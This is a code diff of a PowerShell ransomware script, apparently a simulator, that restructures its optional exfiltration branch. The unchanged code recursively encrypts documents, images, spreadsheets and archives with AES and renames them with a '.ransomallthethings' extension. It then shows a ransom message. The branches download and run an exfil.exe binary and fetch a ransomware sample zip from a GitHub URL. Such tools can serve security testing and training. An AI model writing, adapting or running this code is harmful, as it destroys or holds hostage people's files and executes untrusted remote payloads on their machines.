@@ -11,17 +11,7 @@ if (Test-Path -Path $Folder) {
   $Folder | ForEach-Object {    Get-ChildItem -Path $Folder -Include "*.txt","*.doc","*.docx","*.pdf","*.jpg","*.gif","*.png","*.xls","*.xlsx","*.zip","*.ppt","*.pptx" -Recurse | Where { $_.Length -le "200mb" } | ForEach-Object {       $c = [System.IO.File]::ReadAllBytes($_.FullName);       $cs = [System.Security.Cryptography.CryptoStream]::new($_.OpenWrite(), $aes_crypt, [System.Security.Cryptography.CryptoStreamMode]::Write);       $cs.Write($c, 0, $c.Length);       $cs.Close();       $_.MoveTo($_.FullName + ".ransomallthethings");    }} 
   Add-Type -AssemblyName PresentationCore,PresentationFramework 
   "Test to see if we are exfil-ing"
-  if (Test-Path -Path $Exfil -PathType Leaf) {
-    "Will exfil"
-    $URL = 'https://github.com/PoesRaven/public/raw/master/exfil.exe'
-    $ExfilPath = $HOME + '/Desktop/exfil.exe'
-    "Grabbing file"
-    Invoke-WebRequest -URI $URL -OutFile $ExfilPath
-    "Wait 5 seconds"
-    Start-Sleep -Seconds 5
-    "Running file"
-    Start-Process -FilePath $ExfilPath
-  } elseif (Test-Path -Path $sample -PathType Leaf) {
+  if (Test-Path -Path $sample -PathType Leaf) {
     "******** Will download ransomware - DANGEROUS **************"
     $URL = 'https://github.com/PoesRaven/public/raw/master/darkpower.zip'
     $SamplePath = $HOME + '/Desktop/darkpower.zip'
@@ -36,8 +26,24 @@ if (Test-Path -Path $Folder) {
     Start-Sleep -Seconds 5
     Remove-Item $DestinationPath
   }  else {
-    "Will not exfil or download ransomware"
+    "Will not download ransomware"
   }
+  
+  if (Test-Path -Path $Exfil -PathType Leaf) {
+    "Will exfil"
+    $URL = 'https://github.com/PoesRaven/public/raw/master/exfil.exe'
+    $ExfilPath = $HOME + '/Desktop/exfil.exe'
+    "Grabbing file"
+    Invoke-WebRequest -URI $URL -OutFile $ExfilPath
+    "Wait 5 seconds"
+    Start-Sleep -Seconds 5
+    "Running file"
+    Start-Process -FilePath $ExfilPath
+  } else {
+    "Will not exfil"
+  }
+  
+  
   $msgBody = "All of your important documents have been encrypted. Pay the ransom... or else!!!" 
   [System.Windows.MessageBox]::Show($msgBody)
   "Path exists!"
